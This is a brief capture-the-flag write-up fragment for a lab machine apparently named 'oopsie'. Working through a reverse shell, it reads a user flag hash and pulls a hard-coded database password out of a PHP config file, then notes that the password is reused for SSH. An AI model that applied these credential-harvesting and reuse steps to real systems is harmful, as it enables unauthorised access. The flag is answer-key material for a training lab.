# user.txt
Via the reverse shell connection as www-data
```
$ cd /home/
$ ls
robert
$ cd robert
$ ls -l
total 4
-rw-r--r-- 1 robert robert 33 Feb 25  2020 user.txt
$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

## Credentials found for robert
```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```

These credentials work for (at least) ssh
